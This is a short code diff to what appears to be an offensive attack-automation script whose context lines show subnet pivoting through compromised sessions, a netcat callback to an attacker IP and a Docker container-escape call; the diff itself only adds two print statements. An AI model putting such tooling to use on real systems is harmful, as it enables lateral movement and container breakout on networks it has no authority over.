@@ -67,6 +67,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
         if(target_ip in other_subnet):
             if(atk_sess==None):
                 print(f"{C.COL_RED}[-] subnet not reachable, no intermediate session available{C.COL_RESET}") 
+                print("---------------------------------------------------------")
                 return 
             else:
                 print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
@@ -158,6 +159,7 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                         
                         mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                         #tentiamo la connessione da netcat in entrata dall'operazione di copia effettuata da un admin
+                        print("Tryng docker escape")
                         escape=mc.docker_escape(atk_sess)
                         if(escape):
                             #print(escape)
